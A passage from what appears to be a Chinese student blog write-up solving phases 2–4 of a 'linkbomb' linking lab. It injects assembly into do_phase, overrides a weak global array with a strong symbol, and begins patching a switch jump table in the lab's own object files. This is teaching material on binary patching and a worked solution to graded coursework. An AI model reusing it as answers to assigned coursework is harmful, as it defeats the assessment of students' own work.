class="number">75</span> <span class="number">08</span>             	pushl  <span class="number">0x8</span>(%ebp)</span><br><span class="line">    <span class="number">1234</span>:	e8 <span class="number">07</span> fe ff ff       	call   <span class="number">1040</span> &lt;<span class="built_in">strcmp</span>@plt&gt; <span class="comment">// strcmp</span></span><br><span class="line">    <span class="number">1239</span>:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line">    <span class="number">123</span>c:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line">    <span class="number">123</span>e:	<span class="number">75</span> <span class="number">10</span>                	jne    <span class="number">1250</span> &lt;yeDfwUkv+<span class="number">0x3b</span>&gt; <span class="comment">// do_phase</span></span><br><span class="line">    <span class="number">1240</span>:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">    <span class="number">1243</span>:	ff <span class="number">75</span> <span class="number">08</span>             	pushl  <span class="number">0x8</span>(%ebp)</span><br><span class="line">    <span class="number">1246</span>:	e8 <span class="number">05</span> fe ff ff       	call   <span class="number">1050</span> &lt;<span class="built_in">puts</span>@plt&gt; <span class="comment">// printf的优化</span></span><br><span class="line">    <span class="number">124b</span>:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line">    <span class="number">124</span>e:	eb <span class="number">01</span>                	jmp    <span class="number">1251</span> &lt;yeDfwUkv+<span class="number">0x3c</span>&gt;</span><br><span class="line">    <span class="number">1250</span>:	<span class="number">90</span>                   	nop</span><br><span class="line">    <span class="number">1251</span>:	<span class="number">8b</span> <span class="number">5</span>d fc             	mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line">    <span class="number">1254</span>:	c9                   	leave  </span><br><span class="line">    <span class="number">1255</span>:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>想要在 do_phase 中执行 OUTPUT_FUNC_NAME，打印 ID，必须先传入参数 ID，因为“strcmp(id,MYID)”，参数 ID 在 MYID 中，所以改为传入 MYID 的地址</p>
<p>但是 MYID 的地址是变化的（PIE保护），不能直接获取其地址</p>
<p>但是在动态链接中，地址可以通过GOT表来获取，确定MYID在GOT中的偏移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">121</span>c:	e8 <span class="number">9f</span> fe ff ff       	call   <span class="number">10</span>c0 &lt;__x86.get_pc_thunk.bx&gt; </span><br><span class="line"><span class="number">1221</span>:	<span class="number">81</span> c3 b3 <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span>    	add    $<span class="number">0x2db3</span>,%ebx </span><br><span class="line">    ............</span><br><span class="line"><span class="number">122</span>a:	<span class="number">8</span>d <span class="number">83</span> a8 e0 ff ff    	lea    <span class="number">-0x1f58</span>(%ebx),%eax </span><br><span class="line"><span class="number">1230</span>:	<span class="number">50</span>                   	push   %eax </span><br><span class="line"><span class="number">1231</span>:	ff <span class="number">75</span> <span class="number">08</span>             	pushl  <span class="number">0x8</span>(%ebp)</span><br><span class="line"><span class="number">1234</span>:	e8 <span class="number">07</span> fe ff ff       	call   <span class="number">1040</span> &lt;<span class="built_in">strcmp</span>@plt&gt; <span class="comment">// strcmp          </span></span><br></pre></td></tr></table></figure>
<p>“121c”和“1221”这两步就是为了获取GOT表，装入ebx</p>
<p>“122a”这一步取出了位于偏移为“-0x1f58”的数组，装入eax</p>
<p>“1230”和“1231”这两步显然是把“strcmp”的参数压栈（MYID 和 id，从右往左依次入栈）</p>
<p>而“strcmp”的参数就是 MYID ，反推得“-0x1f58”为MYID在GOT表中的偏移，MYID的地址有了</p>
<p>可以在构思注入 do_phase 的汇编了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.code32 <span class="comment">// 不添加就会报错</span></span><br><span class="line">lea <span class="number">-0x1f58</span>(%eax), %eax</span><br><span class="line">push %eax</span><br><span class="line">call <span class="number">-86</span></span><br><span class="line">pop %eax</span><br></pre></td></tr></table></figure>
<p>查看二进制代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l2] gcc -c <span class="number">2.</span>s -o <span class="number">2.</span>o  </span><br><span class="line">➜  [/home/ywhkkx/ex1.linklab/l2] objdump -d <span class="number">2.</span>o   </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>o：     文件格式 elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">8</span>d <span class="number">80</span> a8 e0 ff ff    	lea    <span class="number">-0x1f58</span>(%rax),%eax</span><br><span class="line">   <span class="number">6</span>:	<span class="number">50</span>                   	push   %rax</span><br><span class="line">   <span class="number">7</span>:	e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">0xc</span></span><br><span class="line">   c:	<span class="number">58</span>                   	pop    %rax</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l2] gcc -m32 -o linkbomb2 main.o phase2.o </span><br><span class="line">➜  [/home/ywhkkx/ex1.linklab/l2] ./linkbomb2 </span><br><span class="line"><span class="number">1180300330</span></span><br></pre></td></tr></table></figure>
<p>成功了，最后再看一眼链接后的 linkbomb2 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00001256</span> &lt;do_phase&gt;:</span><br><span class="line">    <span class="number">1256</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">    <span class="number">1257</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">    <span class="number">1259</span>:	e8 b3 ff ff ff       	call   <span class="number">1211</span> &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">    <span class="number">125</span>e:	<span class="number">05</span> <span class="number">76</span> <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span>       	add    $<span class="number">0x2d76</span>,%eax <span class="comment">/* 因为链接,变具体了 */</span></span><br><span class="line">        <span class="comment">/* 新添 */</span></span><br><span class="line">    <span class="number">1263</span>:	<span class="number">8</span>d <span class="number">80</span> a8 e0 ff ff    	lea    <span class="number">-0x1f58</span>(%eax),%eax </span><br><span class="line">    <span class="number">1269</span>:	<span class="number">50</span>                   	push   %eax</span><br><span class="line">    <span class="number">126</span>a:	e8 a6 ff ff ff       	call   <span class="number">1215</span> &lt;yeDfwUkv&gt;</span><br><span class="line">    <span class="number">126f</span>:	<span class="number">58</span>                   	pop    %eax</span><br></pre></td></tr></table></figure>
<h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><p>创建生成一个名为 “phase3_patch.o” 的二进制可重定位目标文件，使其与 main.o phase3.o 链接后能够运行和输出（且仅输出）自己的学号</p>
<p>模块入口函数 do_phase() 依次遍历一个 COOKIE 字符串（由一组互不相同的英文字母组成，且总长度与学号字符串相同）中的每一字符，并通过一个映射数组将该字符的不同可能 ASCII 编码取值映射为输出字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> PHASE3_CODEBOOK[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_phase</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> <span class="keyword">char</span> cookie[] = PHASE3_COOKIE;</span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(cookie)<span class="number">-1</span>; i++ )</span><br><span class="line">                <span class="built_in">printf</span>( <span class="string">&quot;%c&quot;</span>, PHASE3_CODEBOOK[ (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(cookie[i]) ] );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;\n&quot;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 do_phase 函数反汇编指令，获知 COOKIE 字符串（保存于栈帧中的局部字符数组中）的组成内容和起始地址</li>
<li>定位循环结构，根据 cookie 中字符的使用，定位映射数组的引用位置，结合重定位记录，确定映射数组的变量名</li>
<li>通过符号表，发现该数组为一未初始化变量（类型为COM，长度为256字节）</li>
<li>要改变程序输出（为学号），必须改变该映射数组的内容，因此，可利用强弱全局符号的解析规则，在 patch 模块中定义同名且按输出要求正确初始化映射关系的数组变量——从而在链接时替换对原数组的引用 </li>
</ul>
<p>先执行文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l3] ./linkbomb3 <span class="comment">// 打印了个寂寞</span></span><br></pre></td></tr></table></figure>
<p>PHASE3_CODEBOOK 未知，没有进行初始化，如果我们想要让 do_phase 打印我们需要的数据，就需要另写一个重定位文件对 PHASE3_CODEBOOK 进行初始化</p>
<p>反汇编 linkbomb3 寻找 COOKIE ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00001225</span> &lt;do_phase&gt;:</span><br><span class="line">    <span class="number">1225</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">    <span class="number">1226</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">    <span class="number">1228</span>:	<span class="number">53</span>                   	push   %ebx</span><br><span class="line">    <span class="number">1229</span>:	<span class="number">83</span> ec <span class="number">24</span>             	sub    $<span class="number">0x24</span>,%esp</span><br><span class="line">    <span class="number">122</span>c:	e8 <span class="number">9f</span> fe ff ff       	call   <span class="number">10</span>d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">    <span class="number">1231</span>:	<span class="number">81</span> c3 <span class="number">9f</span> <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span>    	add    $<span class="number">0x2d9f</span>,%ebx</span><br><span class="line">    <span class="number">1237</span>:	<span class="number">65</span> a1 <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	mov    %gs:<span class="number">0x14</span>,%eax</span><br><span class="line">    <span class="number">123</span>d:	<span class="number">89</span> <span class="number">45</span> f4             	mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line">    <span class="number">1240</span>:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">    <span class="number">1242</span>:	c7 <span class="number">45</span> e9 <span class="number">61</span> <span class="number">73</span> <span class="number">74</span> <span class="number">70</span> 	movl   $<span class="number">0x70747361</span>,<span class="number">-0x17</span>(%ebp) <span class="comment">// target</span></span><br><span class="line">    <span class="number">1249</span>:	c7 <span class="number">45</span> ed <span class="number">71</span> <span class="number">72</span> <span class="number">77</span> <span class="number">68</span> 	movl   $<span class="number">0x68777271</span>,<span class="number">-0x13</span>(%ebp) <span class="comment">// target</span></span><br><span class="line">    <span class="number">1250</span>:	<span class="number">66</span> c7 <span class="number">45</span> f1 <span class="number">62</span> <span class="number">66</span>    	movw   $<span class="number">0x6662</span>,<span class="number">-0xf</span>(%ebp) <span class="comment">// target</span></span><br><span class="line">    <span class="number">1256</span>:	c6 <span class="number">45</span> f3 <span class="number">00</span>          	movb   $<span class="number">0x0</span>,<span class="number">-0xd</span>(%ebp)</span><br><span class="line">    <span class="number">125</span>a:	c7 <span class="number">45</span> e4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movl   $<span class="number">0x0</span>,<span class="number">-0x1c</span>(%ebp)</span><br><span class="line">    <span class="number">1261</span>:	eb <span class="number">2b</span>                	jmp    <span class="number">128</span>e &lt;do_phase+<span class="number">0x69</span>&gt;</span><br><span class="line">    <span class="number">1263</span>:	<span class="number">8</span>d <span class="number">55</span> e9             	lea    <span class="number">-0x17</span>(%ebp),%edx</span><br><span class="line">    <span class="number">1266</span>:	<span class="number">8b</span> <span class="number">45</span> e4             	mov    <span class="number">-0x1c</span>(%ebp),%eax</span><br><span class="line">    <span class="number">1269</span>:	<span class="number">01</span> d0                	add    %edx,%eax</span><br><span class="line">    <span class="number">126b</span>:	<span class="number">0f</span> b6 <span class="number">00</span>             	movzbl (%eax),%eax</span><br><span class="line">    <span class="number">126</span>e:	<span class="number">0f</span> b6 c0             	movzbl %al,%eax</span><br><span class="line">    <span class="number">1271</span>:	<span class="number">8</span>d <span class="number">93</span> <span class="number">70</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	lea    <span class="number">0x70</span>(%ebx),%edx</span><br><span class="line">    <span class="number">1277</span>:	<span class="number">0f</span> b6 <span class="number">04</span> <span class="number">02</span>          	movzbl (%edx,%eax,<span class="number">1</span>),%eax</span><br><span class="line">    <span class="number">127b</span>:	<span class="number">0f</span> be c0             	movsbl %al,%eax</span><br><span class="line">    <span class="number">127</span>e:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">    <span class="number">1281</span>:	<span class="number">50</span>                   	push   %eax</span><br><span class="line">    <span class="number">1282</span>:	e8 e9 fd ff ff       	call   <span class="number">1070</span> &lt;<span class="built_in">putchar</span>@plt&gt;</span><br><span class="line">    <span class="number">1287</span>:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line">    <span class="number">128</span>a:	<span class="number">83</span> <span class="number">45</span> e4 <span class="number">01</span>          	addl   $<span class="number">0x1</span>,<span class="number">-0x1c</span>(%ebp)</span><br><span class="line">    <span class="number">128</span>e:	<span class="number">8b</span> <span class="number">45</span> e4             	mov    <span class="number">-0x1c</span>(%ebp),%eax</span><br><span class="line">    <span class="number">1291</span>:	<span class="number">83</span> f8 <span class="number">09</span>             	cmp    $<span class="number">0x9</span>,%eax</span><br><span class="line">    <span class="number">1294</span>:	<span class="number">76</span> cd                	jbe    <span class="number">1263</span> &lt;do_phase+<span class="number">0x3e</span>&gt;</span><br><span class="line">    <span class="number">1296</span>:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">    <span class="number">1299</span>:	<span class="number">6</span>a <span class="number">0</span>a                	push   $<span class="number">0xa</span></span><br><span class="line">    <span class="number">129b</span>:	e8 d0 fd ff ff       	call   <span class="number">1070</span> &lt;<span class="built_in">putchar</span>@plt&gt;</span><br><span class="line">    <span class="number">12</span>a0:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line">    <span class="number">12</span>a3:	<span class="number">90</span>                   	nop</span><br><span class="line">    <span class="number">12</span>a4:	<span class="number">8b</span> <span class="number">45</span> f4             	mov    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line">    <span class="number">12</span>a7:	<span class="number">65</span> <span class="number">33</span> <span class="number">05</span> <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	<span class="keyword">xor</span>    %gs:<span class="number">0x14</span>,%eax</span><br><span class="line">    <span class="number">12</span>ae:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">12b</span>5 &lt;do_phase+<span class="number">0x90</span>&gt;</span><br><span class="line">    <span class="number">12b</span>0:	e8 <span class="number">8b</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	call   <span class="number">1340</span> &lt;__stack_chk_fail_local&gt;</span><br><span class="line">    <span class="number">12b</span>5:	<span class="number">8b</span> <span class="number">5</span>d fc             	mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line">    <span class="number">12b</span>8:	c9                   	leave  </span><br><span class="line">    <span class="number">12b</span>9:	c3                   	ret    </span><br><span class="line">    <span class="number">12b</span>a:	<span class="number">66</span> <span class="number">90</span>                	xchg   %ax,%ax</span><br><span class="line">    <span class="number">12b</span>c:	<span class="number">66</span> <span class="number">90</span>                	xchg   %ax,%ax</span><br><span class="line">    <span class="number">12b</span>e:	<span class="number">66</span> <span class="number">90</span>                	xchg   %ax,%ax</span><br></pre></td></tr></table></figure>
<p>COOKIE 在栈中分配（看到与ebp有关的操作，和密之数字，基本猜到了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1242</span>:	c7 <span class="number">45</span> e9 <span class="number">61</span> <span class="number">73</span> <span class="number">74</span> <span class="number">70</span> 	movl   $<span class="number">0x70747361</span>,<span class="number">-0x17</span>(%ebp) <span class="comment">// target</span></span><br><span class="line"><span class="number">1249</span>:	c7 <span class="number">45</span> ed <span class="number">71</span> <span class="number">72</span> <span class="number">77</span> <span class="number">68</span> 	movl   $<span class="number">0x68777271</span>,<span class="number">-0x13</span>(%ebp) <span class="comment">// target</span></span><br><span class="line"><span class="number">1250</span>:	<span class="number">66</span> c7 <span class="number">45</span> f1 <span class="number">62</span> <span class="number">66</span>    	movw   $<span class="number">0x6662</span>,<span class="number">-0xf</span>(%ebp) <span class="comment">// target</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: a=[<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x70</span>,<span class="number">0x71</span>,<span class="number">0x72</span>,<span class="number">0x77</span>,<span class="number">0x68</span>,<span class="number">0x62</span>,<span class="number">0x66</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: data=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">   ...:     data+=<span class="built_in">chr</span>(a[i])</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">9</span>]: data</span><br><span class="line">Out[<span class="number">9</span>]: <span class="string">&#x27;astpqrwhbf&#x27;</span></span><br></pre></td></tr></table></figure>
<p>再在 GDB 中看看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">04</span>:<span class="number">0010</span>│     <span class="number">0xffffcf00</span> ◂— <span class="number">0x747361fc</span> <span class="comment">/* &#x27;astp&#x27; &gt;&gt; 由于GDB被0xfc干扰,没有打印出来 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│     <span class="number">0xffffcf04</span> ◂— <span class="string">&#x27;pqrwhbf&#x27;</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│     <span class="number">0xffffcf08</span> ◂— <span class="number">0x666268</span> <span class="comment">/* &#x27;hbf&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="number">0xffffcf00</span>+<span class="number">1</span></span><br><span class="line"><span class="number">0xffffcf01</span>:	<span class="string">&quot;astpqrwhbf&quot;</span></span><br></pre></td></tr></table></figure>
<p>文本中的 PHASE3_CODEBOOK 是弱符号（未初始化的全局变量），我们就在 phase3_patch.o 中定义一个强符号来替换它（强符号会优先被定义）</p>
<p>假设我们想让程序输出：YHelow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l3] readelf -s phase3.o </span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">18</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS phase3.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">2</span> </span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">4</span> </span><br><span class="line">     <span class="number">4</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> </span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">6</span> </span><br><span class="line">     <span class="number">6</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">8</span> </span><br><span class="line">     <span class="number">7</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">10</span> </span><br><span class="line">     <span class="number">8</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">11</span> </span><br><span class="line">     <span class="number">9</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">9</span> </span><br><span class="line">    <span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> </span><br><span class="line">    <span class="number">11</span>: <span class="number">00000020</span>   <span class="number">256</span> OBJECT  GLOBAL DEFAULT  COM cDBDohBAOo <span class="comment">// 获取字符串名称</span></span><br><span class="line">    <span class="number">12</span>: <span class="number">00000000</span>   <span class="number">149</span> FUNC    GLOBAL DEFAULT    <span class="number">2</span> do_phase</span><br><span class="line">    <span class="number">13</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN     <span class="number">8</span> __x86.get_pc_thunk.bx</span><br><span class="line">    <span class="number">14</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    <span class="number">15</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">putchar</span></span><br><span class="line">    <span class="number">16</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL HIDDEN   UND __stack_chk_fail_local</span><br><span class="line">    <span class="number">17</span>: <span class="number">00000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">6</span> phase</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>  cDBDohBAOo[<span class="number">256</span>] =   <span class="string">&quot;1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111Y01119121111111lloHe11w&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l3] gcc -m32 -c phase3_patch.c -o phase3_patch.o</span><br><span class="line">➜  [/home/ywhkkx/ex1.linklab/l3] gcc -m32 -o linkbomb3 main.o phase3.o phase3_patch.o</span><br><span class="line">➜  [/home/ywhkkx/ex1.linklab/l3] ./linkbomb3 </span><br><span class="line">YHellow209</span><br></pre></td></tr></table></figure>
<h2 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h2><p>修改二进制可重定位目标文件 “phase4.o” 中相应节中的数据内容（注意不允许修改 .text 节的内容），使其与 main.o 链接后能够运行输出（且仅输出）自己的学号</p>
<p>本阶段学生所拿到的.o文件中的“重定位位置”信息已经被抹除，学生需要根据实际情况确认冲重定位的发生位置，并根据重定位类型对位置信息进行恢复 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> cookie[] = PHASE4_COOKIE; </span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cookie)<span class="number">-1</span>; i++ ) </span><br><span class="line">       &#123;</span><br><span class="line">                c = cookie[i];</span><br><span class="line">                <span class="keyword">switch</span> (c) </span><br><span class="line">                &#123;</span><br><span class="line">                      <span class="comment">// 每个学生的映射关系和case顺序建议不一样</span></span><br><span class="line">                      <span class="keyword">case</span> ‘A’: &#123; c = <span class="number">48</span>; <span class="keyword">break</span>; &#125; </span><br><span class="line">                      <span class="keyword">case</span> ‘B’: &#123; c = <span class="number">121</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">                        …</span><br><span class="line">                      <span class="keyword">case</span> ‘Z’: &#123; c = <span class="number">93</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过分析 do_phase 函数的反汇编程序获知 COOKIE 字符串（保存于栈帧中的局部字符数组中）的组成内容</li>
<li>确定 switch 跳转表在 .rodata 节中的偏移量（“A”，“B”，“C” …… 这些字符都在 .rodata 节中）</li>
<li>定位 COOKIE 中每一字符’c’在switch跳转表中的对应表项（索引为’c’-0x41），将其值设为输出目标学号中对应字符的 case 首指令的偏移量</li>
</ul>
<p>直接运行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l4] ./linkbomb4                          </span><br><span class="line">wl0_TZb3vJ</span><br></pre></td></tr></table></figure>
<p>和 <strong>实验三</strong> 一样的套路，只不过这个在外面包装了 switch-case </p>
<p>故技重施，先反汇编 linkbomb4 寻找 COOKIE ：</p>
